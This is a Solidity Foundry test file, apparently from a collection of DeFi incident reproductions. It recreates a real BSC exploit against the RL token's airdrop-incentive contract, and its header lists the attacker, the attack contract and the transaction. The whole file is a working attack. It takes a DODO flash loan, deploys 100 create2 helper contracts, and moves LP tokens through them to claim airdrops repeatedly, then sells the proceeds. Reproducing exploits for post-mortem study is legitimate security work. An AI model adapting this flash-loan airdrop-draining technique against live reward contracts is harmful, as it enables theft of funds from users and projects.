//SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// Report https://twitter.com/CertiKAlert/status/1576195971003858944
// Attacker : 0x08e08f4b701d33c253ad846868424c1f3c9a4db3
// Attack Contract : 0x5EfD021Ab403B5b6bBD30fd2E3C26f83f03163d4
// Vulnerable Contract : https://bscscan.com/address/0x4bbfae575dd47bcfd5770ab4bc54eb83db088888
// Attack Tx  0xe15d261403612571edf8ea8be78458b88989cf1877f0b51af9159a76b74cb466
interface IDODO {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;

    function _BASE_TOKEN_() external view returns (address);
}

interface RLLpIncentive {
    function distributeAirdrop(address user) external;
}

contract AirDropRewardContract {
    IERC20 RL = IERC20(0x4bBfae575Dd47BCFD5770AB4bC54Eb83DB088888);
    RLLpIncentive RLL = RLLpIncentive(0x335ddcE3f07b0bdaFc03F56c1b30D3b269366666);
    IERC20 Pair = IERC20(0xD9578d4009D9CC284B32D19fE58FfE5113c04A5e);

    constructor() {
        RL.transfer(address(this), 0);
    }

    function airDropReward(address receiver) external {
        RLL.distributeAirdrop(address(this));
        RL.transfer(receiver, RL.balanceOf(address(this)));
        Pair.transfer(receiver, Pair.balanceOf(address(this)));
    }
}

contract ContractTest is Test {
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 RL = IERC20(0x4bBfae575Dd47BCFD5770AB4bC54Eb83DB088888);
    RLLpIncentive RLL = RLLpIncentive(0x335ddcE3f07b0bdaFc03F56c1b30D3b269366666);
    IDODO dodo = IDODO(0xD7B7218D778338Ea05f5Ecce82f86D365E25dBCE);
    IERC20 Pair = IERC20(0xD9578d4009D9CC284B32D19fE58FfE5113c04A5e);
    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    address[] public contractAddress;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 21_794_289);
    }

    function testExploit() external {
        emit log_named_decimal_uint("[Start] Attacker USDT balance before exploit", USDT.balanceOf(address(this)), 18);

        USDT.approve(address(Router), ~uint256(0));
        RL.approve(address(Router), ~uint256(0));
        Pair.approve(address(Router), ~uint256(0));
        airDropContractFactory();
        //change timestamp to pass check
        cheats.warp(block.timestamp + 24 * 60 * 60);
        dodo.flashLoan(0, 450_000 * 1e18, address(this), new bytes(1));

        emit log_named_decimal_uint("[End] Attacker USDT balance after exploit", USDT.balanceOf(address(this)), 18);
    }

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        buyRLAndAddLiquidity();
        //claimAirDrop
        for (uint256 i = 0; i < contractAddress.length; i++) {
            Pair.transfer(contractAddress[i], Pair.balanceOf(address(this)));
            (bool success,) = contractAddress[i].call(abi.encodeWithSignature("airDropReward(address)", address(this)));
            require(success);
        }

        removeLiquidityAndSellRL();
        USDT.transfer(msg.sender, 450_000 * 1e18);
    }

    function buyRLAndAddLiquidity() public {
        address[] memory path = new address[](2);
        path[0] = address(USDT);
        path[1] = address(RL);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            150_000 * 1e18, 0, path, address(this), block.timestamp
        );

        Router.addLiquidity(
            address(USDT),
            address(RL),
            USDT.balanceOf(address(this)),
            RL.balanceOf(address(this)),
            0,
            0,
            address(this),
            block.timestamp
        );
    }

    function removeLiquidityAndSellRL() public {
        Router.removeLiquidity(
            address(USDT), address(RL), Pair.balanceOf(address(this)), 0, 0, address(this), block.timestamp
        );

        address[] memory path = new address[](2);
        path[0] = address(RL);
        path[1] = address(USDT);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            RL.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }

    function airDropContractFactory() public {
        address _add;
        bytes memory bytecode = type(AirDropRewardContract).creationCode;
        for (uint256 _salt = 0; _salt < 100; _salt++) {
            assembly {
                _add := create2(0, add(bytecode, 32), mload(bytecode), _salt)
            }
            contractAddress.push(_add);
        }
    }
}
